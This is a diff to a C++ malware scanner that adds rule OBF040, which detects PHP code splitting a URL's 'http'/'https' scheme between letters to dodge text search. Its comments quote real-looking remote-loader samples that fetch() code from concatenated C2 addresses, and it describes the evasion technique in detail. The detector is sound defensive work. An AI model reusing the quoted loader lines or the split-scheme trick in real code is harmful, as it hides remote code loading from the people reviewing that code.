@@ -1,9 +1,11 @@
 #include "obfuscation.h"
 #include "analysis/StringAssembly.h"
+#include <algorithm>
 #include <array>
 #include <cctype>
 #include <fmt/format.h>
 #include <string>
+#include <vector>
 
 namespace lyxbosa::rules::obfuscation {
 
@@ -1268,6 +1270,184 @@ const BuiltinRule OBF039 {
     .analyzer = &detail_OBF039::detectSubstitutionCipher,
 };
 
+// OBF040: a URL whose scheme word is cut in half
+//
+// A remote-loader family staged a C2 address this way, in seven distinct blobs across
+// three campaigns:
+//
+//     $code = fetch('htt'.'ps://c.by'.'a61.xy'.'z/');
+//     $code = fetch('ht'.'tps://5'.'1la.zv'.'o2.x'.'yz/a1.t'.'xt');
+//     $code = fetch('h'.'t'.'t'.'p'.'s'.'://raw.githubusercontent.com/...');
+//
+// The folded value is a URL, so OBF024/OBF025 cannot see it: the constant folder
+// behind them records only values that are *identifiers*, and that restriction is
+// deliberate - assembled paths, SQL and messages are where its false positives live.
+// A URL is none of those things and needs its own predicate.
+//
+// The condition that carries the rule is WHERE the cut falls. Real code does split
+// URLs across concatenated literals - 208 files in the benign trees build one that
+// way - because a long address does not fit a line. What it splits at is punctuation:
+//
+//     'The script ... Please see: http:'      <- w3-total-cache, wrapping a message
+//         .'//code.google.com/p/minify/...'
+//
+// That break is at the colon. Every honest wrap in the measured population breaks at
+// the ':' or inside the '//', because those are where a URL reads as having a seam.
+// Cutting between two letters of the scheme word itself - `htt`|`ps` - has no
+// line-length justification and no editor would produce it; the only thing it
+// accomplishes is that a search for "https://" no longer finds the address. So the
+// boundary must fall STRICTLY between two letters of the scheme, which is also what
+// excludes the plausible-but-honest `'http' . '://'`.
+//
+// Deliberately NOT extended to a split `<?php` tag, which was the first thing tried.
+// It cannot work: `"<" . "?php die(); ?" . ">"` is how wp-super-cache writes a guard
+// header and how Magento writes a config fixture, three of the four benign files that
+// split any marker do exactly this, and the malware's own `'<'.'?p'.'hp'` is the same
+// shape. There is no margin there to measure, so there is no rule.
+namespace detail_OBF040 {
+    constexpr size_t kMaxFragmentBytes = 4096;   // one literal in a concatenation run
+    constexpr size_t kMaxFindings = 4;
+
+    struct Fragment {
+        size_t offset;   // byte offset of the opening quote in the source
+        size_t begin;    // offset of this fragment's first byte in the folded text
+    };
+
+    // One quoted literal starting at `i`, which must be the opening quote. Appends the
+    // body to `out` and returns one past the closing quote, or npos.
+    //
+    // A backslash escape contributes its two source bytes verbatim. That is not a
+    // faithful PHP unescape, and it does not need to be: the scheme words this rule
+    // looks for contain no backslash, so the only thing an escape can do is make the
+    // folded text longer than the real value - it can never manufacture an "http"
+    // that the program does not actually build.
+    size_t readLiteral(std::string_view c, size_t i, std::string& out) {
+        if (i >= c.size() || (c[i] != '\'' && c[i] != '"')) return std::string_view::npos;
+        const char q = c[i];
+        size_t j = i + 1;
+        while (j < c.size()) {
+            if (c[j] == '\\' && j + 1 < c.size()) {
+                out.append(c, j, 2);
+                j += 2;
+                continue;
+            }
+            if (c[j] == q) return j + 1;
+            out.push_back(c[j]);
+            ++j;
+        }
+        return std::string_view::npos;   // unterminated
+    }
+
+    inline bool isSpace(char ch) {
+        return ch == ' ' || ch == '\t' || ch == '\n' || ch == '\r';
+    }
+
+    inline char lower(char ch) {
+        return (ch >= 'A' && ch <= 'Z') ? static_cast<char>(ch - 'A' + 'a') : ch;
+    }
+
+    // True when some fragment boundary falls strictly inside the scheme word - that is,
+    // strictly between the 'h' at `at` and the ':' that ends the word.
+    //
+    // `frags` is in source order, so its `begin` offsets ascend and the first boundary
+    // past `at` can be found by bisection. A file that is one 10,000-literal
+    // concatenation would otherwise be quadratic here.
+    bool cutInsideSchemeWord(const std::vector<Fragment>& frags, size_t at, size_t colon) {
+        const auto first = std::upper_bound(
+            frags.begin() + 1, frags.end(), at,
+            [](size_t v, const Fragment& f) { return v < f.begin; });
+        return first != frags.end() && first->begin < colon;
+    }
+
+    std::vector<MatchResult> detectSplitScheme(std::string_view content) {
+        std::vector<MatchResult> out;
+        // Cheap guard. Every match needs the letters of a scheme somewhere in the file,
+        // and the cut means they are not contiguous - so gate on the shortest piece
+        // that survives any cut of "http": the concatenation operator, plus 'h'.
+        if (content.find('.') == std::string_view::npos) return out;
+
+        std::string folded;
+        std::vector<Fragment> frags;
+
+        size_t i = 0;
+        while (i < content.size()) {
+            if (content[i] != '\'' && content[i] != '"') { ++i; continue; }
+
+            folded.clear();
+            frags.clear();
+
+            size_t j = i;
+            size_t runEnd = i;
+            while (true) {
+                const size_t mark = folded.size();
+                const size_t end = readLiteral(content, j, folded);
+                if (end == std::string_view::npos || folded.size() - mark > kMaxFragmentBytes) {
+                    folded.resize(mark);
+                    break;
+                }
+                frags.push_back({j, mark});
+                runEnd = end;
+                size_t k = end;
+                while (k < content.size() && isSpace(content[k])) ++k;
+                if (k >= content.size() || content[k] != '.') break;
+                ++k;
+                while (k < content.size() && isSpace(content[k])) ++k;
+                if (k >= content.size() || (content[k] != '\'' && content[k] != '"')) break;
+                j = k;
+            }
+
+            if (frags.size() >= 2) {
+                // Find each scheme in the folded text and test where the seams fall.
+                for (size_t p = 0; p + 7 <= folded.size(); ++p) {
+                    if (lower(folded[p]) != 'h') continue;
+                    // The word is 4 or 5 letters, so the ':' can only be within 6 bytes.
+                    // Bounding the search keeps this linear on a run with many 'h's and
+                    // no colon at all.
+                    const size_t limit = std::min(folded.size(), p + 6);
+                    size_t w = p;
+                    while (w < limit && folded[w] != ':') ++w;
+                    if (w >= limit || w - p < 4 || w - p > 5) continue;
+                    if (w + 2 >= folded.size() || folded[w + 1] != '/' || folded[w + 2] != '/') continue;
+
+                    std::string word;
+                    for (size_t q = p; q < w; ++q) word.push_back(lower(folded[q]));
+                    if (word != "http" && word != "https") continue;
+                    if (!cutInsideSchemeWord(frags, p, w)) continue;
+
+                    // Report at the first literal of the run, which is where a reader
+                    // has to start to see the assembly.
+                    auto [line, col] = positionToLineCol(content, frags.front().offset);
+                    MatchResult r;
+                    r.line = line;
+                    r.column = col;
+                    r.matched = content.substr(frags.front().offset,
+                                               std::min<size_t>(runEnd - frags.front().offset, 96));
+                    r.note = "URL scheme split across a concatenation boundary: " +
+                             std::to_string(frags.size()) +
+                             " literals assemble \"" +
+                             folded.substr(p, std::min<size_t>(folded.size() - p, 64)) +
+                             "\", with the cut inside the word \"" + word +
+                             "\" rather than at its punctuation";
+                    out.push_back(r);
+                    if (out.size() >= kMaxFindings) return out;
+                    break;   // one finding per concatenation run
+                }
+            }
+
+            i = (runEnd > i) ? runEnd : i + 1;
+        }
+        return out;
+    }
+}
+const BuiltinRule OBF040 {
+    .code = {Category::Obfuscation, 40},
+    .name = "Split URL scheme",
+    .description = "Detects a URL whose scheme word is cut between two letters by string concatenation, hiding the address from a text search",
+    .severity = Severity::High,
+    .patterns = {},
+    .analyzer = &detail_OBF040::detectSplitScheme,
+};
+
 
 static const std::array<const BuiltinRule*, RULE_COUNT> ALL_RULES = {
     &OBF001, &OBF002, &OBF003, &OBF004, &OBF005,
@@ -1275,7 +1455,7 @@ static const std::array<const BuiltinRule*, RULE_COUNT> ALL_RULES = {
     &OBF011, &OBF012, &OBF013, &OBF014, &OBF015, &OBF016,
     &OBF017, &OBF018, &OBF019, &OBF020, &OBF021, &OBF022, &OBF023,
     &OBF024, &OBF025, &OBF029, &OBF036, &OBF037, &OBF038,
-    &OBF039
+    &OBF039, &OBF040
 };
 
 const BuiltinRule* const* getAllRules() {
